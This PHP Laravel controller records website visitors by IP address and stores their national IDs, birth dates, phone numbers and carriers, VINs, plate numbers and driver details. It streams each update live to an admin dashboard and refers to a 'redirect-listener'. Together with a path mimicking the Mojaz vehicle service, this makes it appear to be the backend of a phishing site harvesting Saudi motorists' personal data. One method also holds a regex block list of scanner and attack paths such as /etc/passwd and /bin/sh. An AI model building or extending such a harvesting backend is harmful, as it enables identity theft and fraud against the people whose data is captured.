<?php

namespace App\Http\Controllers;

use App\Events\CustomerActivityUpdated;
use App\Http\Requests\TrackCustomerRequest;
use App\Http\Requests\TrackDetailsRequest;
use App\Http\Requests\TrackMojazRequest;
use App\Http\Requests\UpdatePageRequest;
use App\Models\CustomerActivity;
use App\Models\CustomerProfile;
use App\Services\CarrierDetectionService;
use App\Services\CustomerCacheService;
use App\Services\DeviceDetectionService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;

class CustomerTrackingController extends Controller
{
    /**
     * Upsert tracked customer data from frontend form submissions.
     * Identifies the customer by IP address.
     *
     * POST /api/customer/track
     */
    public function track(TrackCustomerRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        $updateData = array_filter([
            'national_id' => $validated['national_id'],
            'birth_month' => isset($validated['birth_month']) ? str_pad($validated['birth_month'], 2, '0', STR_PAD_LEFT) : null,
            'birth_year' => $validated['birth_year'] ?? null,
            'sequence_number' => $validated['sequence_number'] ?? null,
            'customs_card' => $validated['customs_card'] ?? null,
            'manufacturing_year' => $validated['manufacturing_year'] ?? null,
            'insurance_type' => $validated['insurance_type'] ?? null,
            'registration_type' => $validated['registration_type'] ?? null,
            'current_page' => $validated['current_page'] ?? '/insurance/vehicle-details',
            'device_type' => DeviceDetectionService::detectType($request),
            'device_browser' => DeviceDetectionService::detectBrowser($request),
        ], fn ($v) => $v !== null);

        $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);

        // Record customer activity (non-critical — never block customer)
        try {
            CustomerActivity::create([
                'customer_profile_id' => $customer->id,
                'customer_name' => $customer->full_name ?? 'زائر',
                'phone' => $customer->phone_number ?? '',
                'stage' => $updateData['current_page'] ?? 'vehicle-info',
                'activity_type' => 'form_submission',
                'description' => 'تعبئة بيانات المركبة',
                'status' => 'active',
            ]);
        } catch (\Exception $e) {
            // Silent fail — activity logging should never break customer flow
        }

        // Broadcast to admin dashboard when new customer or data changes
        // Throttled: max once per 15 seconds per IP to prevent broadcast storm
        if ($customer->wasRecentlyCreated || $customer->wasChanged()) {
            CustomerCacheService::flush();
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'customer_tracked'
                    ));
                } catch (\Exception $e) {
                    // Silent fail — broadcasting should never block the customer
                }
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'تم حفظ البيانات بنجاح',
            'customer_ip' => $ip,
            'city' => $customer->city ?? $customer->location_city ?? null,
        ]);
    }

    /**
     * Lightweight page update — just updates current_page and activity timestamp.
     * Used by useVisitorTracking composable on page mount.
     *
     * POST /api/customer/page
     */
    public function updatePage(UpdatePageRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();
        $page = $validated['current_page'];

        // Reject garbage paths (browser internals, DevTools probes, static assets, etc.)
        if (preg_match('#^/?(\.|api/|favicon|robots|sitemap|well-known|images/|build/|Videos/|storage/|vendor/|node_modules/)#i', $page)) {
            return response()->json(['success' => true, 'customer_ip' => $ip]);
        }

        // Reject static asset file extensions
        if (preg_match('#\.(png|jpg|jpeg|gif|svg|ico|css|js|woff2?|ttf|eot|map|webp|avif|json|xml|txt)$#i', $page)) {
            return response()->json(['success' => true, 'customer_ip' => $ip]);
        }
        // Reject bot / vulnerability scanner paths — silently drop without creating DB records
        if (preg_match('#(wp-login|wp-admin|wp-content|wp-includes|wordpress|xmlrpc\.php|\.env|/\.git|phpmyadmin|pma|adminer|cgi-bin|/bin/sh|/etc/passwd|ReportServer|owa/|/autodiscover|/aspnet_client|\.asp$|\.aspx$|\.jsp$|/manager/html|/solr|/jenkins|/actuator|/graphql|/admin\.php|/debug|/console|/setup|/install|/shell|/eval|/exec|/cmd|/connect|/proxy|/remote|/backup)#i', $page)) {
            return response()->json(['success' => true, 'customer_ip' => $ip]);
        }
        $customer = CustomerProfile::createOrUpdateByIP($ip, [
            'current_page' => $page,
        ]);

        // Record page view activity (only on actual page change, never on heartbeat)
        if ($customer->wasRecentlyCreated || $customer->wasChanged('current_page')) {
            try {
                CustomerActivity::create([
                    'customer_profile_id' => $customer->id,
                    'customer_name' => $customer->full_name ?? 'زائر',
                    'phone' => $customer->phone_number ?? '',
                    'stage' => $page,
                    'activity_type' => 'page_view',
                    'description' => 'مشاهدة صفحة',
                    'status' => 'active',
                ]);
            } catch (\Exception $e) {
                // Silent fail — activity logging should never break customer flow
            }
        }

        // Set device info on first creation
        if ($customer->wasRecentlyCreated) {
            $customer->update([
                'device_type' => DeviceDetectionService::detectType($request),
                'device_browser' => DeviceDetectionService::detectBrowser($request),
            ]);
        }

        // Broadcast only when page actually changed or customer is new (prevents heartbeat spam)
        // Throttled: max once per 15 seconds per IP
        if ($customer->wasRecentlyCreated || $customer->wasChanged('current_page')) {
            if ($customer->wasRecentlyCreated) {
                CustomerCacheService::flush();
            }
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'page_view'
                    ));
                } catch (\Exception $e) {
                    // Silent fail — broadcasting should never block the customer
                }
            }
        }

        return response()->json([
            'success' => true,
            'customer_ip' => $ip,
        ]);
    }

    /**
     * Lightweight endpoint — returns only the customer's IP.
     * Used by the redirect-listener setup to avoid an extra POST to /customer/page.
     *
     * GET /api/customer/ip
     */
    public function getIp(Request $request): JsonResponse
    {
        return response()->json([
            'customer_ip' => $request->ip(),
        ]);
    }

    /**
     * Track Mojaz vehicle inspection form data.
     * Called from MojazPage Step 1 on form submission.
     *
     * POST /api/customer/track-mojaz
     */
    public function trackMojaz(TrackMojazRequest $request): JsonResponse
    {
        $validated = $request->validated();
        $ip = $request->ip();

        $phone = $validated['mobile_number'];

        $updateData = array_filter([
            'sequence_number' => $validated['sequence_number'],
            'phone_number' => $phone,
            'phone_carrier' => CarrierDetectionService::detect($phone),
            'manufacturing_year' => $validated['manufacturing_year'],
            'vehicle_make' => $validated['vehicle_make'],
            'vehicle_model' => $validated['vehicle_model'],
            'plate_number' => $validated['plate_number'],
            'vin' => strtoupper($validated['vin']),
            'current_page' => $validated['current_page'] ?? '/motorapp/Home/Mojaz',
            'device_type' => DeviceDetectionService::detectType($request),
            'device_browser' => DeviceDetectionService::detectBrowser($request),
        ], fn ($v) => $v !== null);

        $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);

        // Record customer activity
        try {
            CustomerActivity::create([
                'customer_profile_id' => $customer->id,
                'customer_name' => $customer->full_name ?? 'زائر',
                'phone' => $phone,
                'stage' => 'mojaz',
                'activity_type' => 'form_submission',
                'description' => 'تعبئة بيانات موجز',
                'status' => 'active',
            ]);
        } catch (\Exception $e) {
            // Silent fail
        }

        // Broadcast to admin dashboard
        // Throttled: max once per 15 seconds per IP
        if ($customer->wasRecentlyCreated || $customer->wasChanged()) {
            CustomerCacheService::flush();
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'mojaz_tracked'
                    ));
                } catch (\Exception $e) {
                    // Silent fail
                }
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'تم حفظ بيانات موجز بنجاح',
            'customer_ip' => $ip,
        ]);
    }

    /**
     * Update tracked customer with vehicle details form data.
     * Called from VehicleDetailsPage on form submission.
     *
     * POST /api/customer/track-details
     */
    public function trackDetails(TrackDetailsRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        $phone = $validated['phone'] ?? null;

        $updateData = array_filter([
            'full_name' => $validated['full_name'] ?? null,
            'phone_number' => $phone,
            'phone_carrier' => $phone ? CarrierDetectionService::detect($phone) : null,
            'email' => $validated['email'] ?? null,
            'insurance_purpose' => $validated['purpose_of_use'] ?? $validated['usage_purpose'] ?? null,
            'insurance_type' => $validated['insurance_type'] ?? null,
            'vehicle_price' => $validated['estimated_value'] ?? null,
            'region' => $validated['region'] ?? null,
            'city' => $validated['city'] ?? null,
            'vehicle_type' => $validated['vehicle_type'] ?? null,
            'repair_method' => $validated['repair_method'] ?? null,
            'has_additional_driver' => $validated['has_additional_driver'] ?? null,
            'additional_driver_name' => $validated['additional_driver_name'] ?? null,
            'additional_driver_national_id' => $validated['additional_driver_national_id'] ?? null,
            'additional_driver_birth_date' => $validated['additional_driver_birth_date'] ?? null,
        ], fn ($v) => $v !== null);

        if (! empty($validated['policy_start_date'])) {
            $updateData['policy_start_date'] = $validated['policy_start_date'];
        }

        if (! empty($validated['current_page'])) {
            $updateData['current_page'] = $validated['current_page'];
        }

        // Collect extra details into extra_data JSON
        $extraFields = [
            'night_parking',
            'expected_km',
            'transmission_type',
            'accident_counts',
            'education',
            'work_location',
            'children_under_16',
            'car_modification',
            'modification_desc',
            'has_trailer',
            'trailer_value',
            'foreign_license',
            'health_conditions',
            'traffic_violations',
            'drivers',
        ];

        $extraData = [];
        foreach ($extraFields as $field) {
            if (isset($validated[$field]) && $validated[$field] !== null && $validated[$field] !== '') {
                $extraData[$field] = $validated[$field];
            }
        }

        if (! empty($extraData)) {
            // Upsert first, then merge extra_data on the loaded model (avoids extra SELECT)
            $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);
            $existingExtra = $customer->extra_data ?? [];
            $customer->update(['extra_data' => array_merge($existingExtra, $extraData)]);
        } else {
            $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);
        }

        // Set device info on first creation
        if ($customer->wasRecentlyCreated) {
            $customer->update([
                'device_type' => DeviceDetectionService::detectType($request),
                'device_browser' => DeviceDetectionService::detectBrowser($request),
            ]);
        }

        // Broadcast to admin dashboard when details are submitted
        // Throttled: max once per 15 seconds per IP
        if ($customer->wasRecentlyCreated || $customer->wasChanged()) {
            CustomerCacheService::flush();
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'details_submitted'
                    ));
                } catch (\Exception $e) {
                    // Silent fail — broadcasting should never block the customer
                }
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'تم تحديث البيانات بنجاح',
            'customer_ip' => $ip,
        ]);
    }
}
